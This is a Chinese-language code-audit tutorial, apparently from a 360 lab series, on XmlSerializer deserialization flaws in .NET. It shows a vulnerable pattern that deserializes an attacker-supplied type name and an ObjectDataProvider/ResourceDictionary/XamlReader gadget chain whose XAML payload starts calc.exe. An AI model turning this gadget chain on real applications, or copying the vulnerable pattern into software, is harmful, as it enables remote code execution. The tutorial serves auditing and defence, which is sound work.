# 云影实验室 .NET 高级代码审计系列（第一课）：XmlSerializer 反序列化漏洞
作者：Ivan1ee@360 云影实验室  
日期：2019 年 03 月 01 日

## 0x00 前言
在 .NET 框架中，`XmlSerializer` 类是一个强大的工具，用于将高度结构化的 XML 数据映射到 .NET 对象。该类通过单个 API 调用来实现 XML 文档和对象之间的转换。映射规则由 .NET 类中的元数据属性定义。如果开发者使用 `Type` 类的静态方法获取外部数据，并调用 `Deserialize` 方法反序列化 XML 数据，则可能会触发反序列化漏洞攻击（例如 DotNetNuke 任意代码执行漏洞 CVE-2017-9822）。本文将从原理和代码审计的角度介绍相关概念，并提供复现步骤。

## 0x01 XmlSerializer 序列化
`System.Xml.Serialization` 命名空间下的 `XmlSerializer` 类可以将 XML 文档绑定到 .NET 类的实例。需要注意的是，它只能将对象的公共属性和字段转换为 XML 元素或属性。`XmlSerializer` 提供了两个主要方法：
- `Serialize()`：将对象实例转换为 XML。
- `Deserialize()`：将 XML 文档解析为对象图。

被序列化的数据可以是数据、字段、数组以及 `XmlElement` 和 `XmlAttribute` 对象格式的嵌入式 XML。具体示例如下：

```csharp
[XmlElement]
public string PropertyName { get; set; }

[XmlAttribute]
public string AttributeName { get; set; }

[XmlRoot("RootElement")]
public class TestClass
{
    public string ClassName { get; set; }
}

// 序列化示例
var testInstance = new TestClass { ClassName = "Test" };
var serializer = new XmlSerializer(typeof(TestClass));
using (var writer = new StreamWriter("output.xml"))
{
    serializer.Serialize(writer, testInstance);
}
```

## 0x02 XmlSerializer 反序列化
反序列化过程涉及将 XML 文件转换回对象。关键在于 `XmlSerializer` 构造函数中传递的参数，该参数来自 `System.Type` 类，提供了关于任意数据类型的信息。有以下三种方式获取 `Type` 引用：

### 2.1 typeof
使用 `typeof` 运算符获取类型的 `Type`。例如：
```csharp
var type = typeof(TestClass);
var serializer = new XmlSerializer(type);
```

### 2.2 object.GetType()
所有类都派生自 `System.Object`，可以通过 `GetType()` 方法获取当前对象的 `Type`。例如：
```csharp
var testInstance = new TestClass();
var type = testInstance.GetType();
var serializer = new XmlSerializer(type);
```

### 2.3 Type.GetType
使用 `Type.GetType` 静态方法，传入字符串形式的全限定名称来获取 `Type`。这是反序列化漏洞的一个潜在污染点。例如：
```csharp
var typeName = "Namespace.TestClass, AssemblyName";
var type = Type.GetType(typeName);
var serializer = new XmlSerializer(type);
```

## 0x03 打造攻击链
### 3.1 ObjectDataProvider
`ObjectDataProvider` 类位于 `System.Windows.Data` 命名空间下，可以调用任意引用类中的方法。其主要成员包括：
- `ObjectInstance`：类似实例化的类。
- `MethodName`：要调用的方法名称。
- `MethodParameters`：传递给方法的参数。

示例：
```csharp
public class TestClass
{
    public void ClassMethod()
    {
        System.Diagnostics.Process.Start("calc.exe");
    }
}

var provider = new ObjectDataProvider
{
    ObjectInstance = new TestClass(),
    MethodName = "ClassMethod"
};
```

### 3.2 ResourceDictionary
`ResourceDictionary` 通常用于 WPF 或 UWP 应用程序中共享静态资源。XAML 是基于 XML 的标记语言，用于定义 UI 结构。示例：
```xml
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                    xmlns:Runtime="clr-namespace:System.Diagnostics;assembly=mscorlib">
    <ObjectDataProvider x:Key="ProcessProvider" 
                        ObjectType="{x:Type Runtime:Process}" 
                        MethodName="Start">
        <ObjectDataProvider.MethodParameters>
            <sys:String>calc.exe</sys:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>
```

### 3.3 XamlReader
`XamlReader` 位于 `System.Windows.Markup` 命名空间下，用于读取 XAML 文件。示例：
```csharp
var xaml = @"<ResourceDictionary ...>";
var root = XamlReader.Parse(xaml);
```

## 0x04 代码审计视角
从代码审计的角度，很容易找到反序列化漏洞的污染点。关键在于 `Type.GetType` 方法。示例：
```csharp
var xmlDoc = new XmlDocument();
xmlDoc.Load("input.xml");
var typeName = xmlDoc.SelectSingleNode("//Item").Attributes["type"].Value;
var type = Type.GetType(typeName);
var serializer = new XmlSerializer(type);
var reader = new XmlNodeReader(xmlDoc.SelectSingleNode("//Item"));
var obj = serializer.Deserialize(reader);
```

## 0x05 案例复盘
通过以下案例复盘整个过程：
1. 加载远程 XML 文件。
2. 获取 XML 数据。
3. 通过 `GetType` 方法获取 `Type`。
4. 反序列化并执行命令。

## 0x06 总结
`XmlSerializer` 是系统默认的反序列化类，在实际开发中使用率较高。攻击者可以通过控制污染点来寻找利用点，如 Web 应用程序中的命令执行或写 WebShell 的类和方法，或者利用 `ObjectDataProvider`、`ResourceDictionary` 和 `XamlReader` 组成的攻击链执行命令或反弹 Shell。

后续课程大纲和更多高质量的 .NET 反序列化漏洞文章将在以下地址发布：
- [GitHub](https://github.com/Ivan1ee/)
- [GitBook](https://ivan1ee.gitbook.io/)

欢迎持续关注和交流。